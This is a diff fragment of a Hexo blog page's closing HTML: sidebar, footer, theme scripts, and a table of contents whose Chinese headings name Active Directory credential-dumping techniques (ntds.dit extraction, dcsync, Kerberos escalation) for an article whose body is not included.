+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Laplace</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">57</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">69</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7%E5%AE%89%E5%85%A8"><span class="nav-number">1.</span> <span class="nav-text">域控安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9Dntds-dit"><span class="nav-number">1.1.</span> <span class="nav-text">卷影拷贝ntds.dit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87ntdsutil-exe%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-number">1.1.1.</span> <span class="nav-text">通过ntdsutil.exe提取ntds.dit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8vssadmin%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-number">1.1.2.</span> <span class="nav-text">利用vssadmin提取ntds.dit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8vssown-vbs%E8%84%9A%E6%9C%AC%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-number">1.1.3.</span> <span class="nav-text">利用vssown.vbs脚本提取ntds.dit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8IFM%E5%88%9B%E5%BB%BA%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D"><span class="nav-number">1.1.4.</span> <span class="nav-text">使用IFM创建卷影拷贝</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8diskshadow%E5%AF%BC%E5%87%BA-ntds-dit"><span class="nav-number">1.1.5.</span> <span class="nav-text">使用diskshadow导出 ntds.dit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%91%E6%8E%A7%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E6%9C%8D%E5%8A%A1%E7%9A%84%E4%BD%BF%E7%94%A8%E6%83%85%E5%86%B5"><span class="nav-number">1.1.6.</span> <span class="nav-text">监控卷影拷贝服务的使用情况</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BC%E5%87%BAntds-dit%E4%B8%AD%E7%9A%84%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">1.2.</span> <span class="nav-text">导出ntds.dit中的散列值</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#esedbexport-%E6%81%A2%E5%A4%8Dntds-dit%E4%BF%A1%E6%81%AF"><span class="nav-number">1.2.1.</span> <span class="nav-text">esedbexport 恢复ntds.dit信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8impacket%E5%AF%BC%E5%87%BA%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">1.2.2.</span> <span class="nav-text">使用impacket导出散列值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows%E4%B8%AD%E8%A7%A3%E6%9E%90ntds-dit"><span class="nav-number">1.2.3.</span> <span class="nav-text">Windows中解析ntds.dit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8dcsync%E8%8E%B7%E5%BE%97%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">1.3.</span> <span class="nav-text">使用dcsync获得散列值</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%BE%97%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">1.3.1.</span> <span class="nav-text">使用mimikatz获得散列值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8dcsync%E8%8E%B7%E5%BE%97%E5%9F%9F%E5%B8%90%E5%8F%B7%E5%92%8C%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">1.3.2.</span> <span class="nav-text">使用dcsync获得域帐号和散列值</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Metasploit%E8%8E%B7%E5%BE%97%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">1.4.</span> <span class="nav-text">使用Metasploit获得散列值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8vshadown-exe-%E5%92%8CQuarksPwDump-exe%E5%AF%BC%E5%87%BAHash"><span class="nav-number">1.5.</span> <span class="nav-text">使用vshadown.exe 和QuarksPwDump.exe导出Hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos%E5%9F%9F%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83"><span class="nav-number">1.6.</span> <span class="nav-text">Kerberos域用户提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PyKEK%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="nav-number">1.6.1.</span> <span class="nav-text">PyKEK工具包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B"><span class="nav-number">1.6.2.</span> <span class="nav-text">流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#goldenPac-py"><span class="nav-number">1.6.3.</span> <span class="nav-text">goldenPac.py</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Laplace</span>
+
+  
+</div>
+
+<!--
+隐藏下标强力驱动
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+-->
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
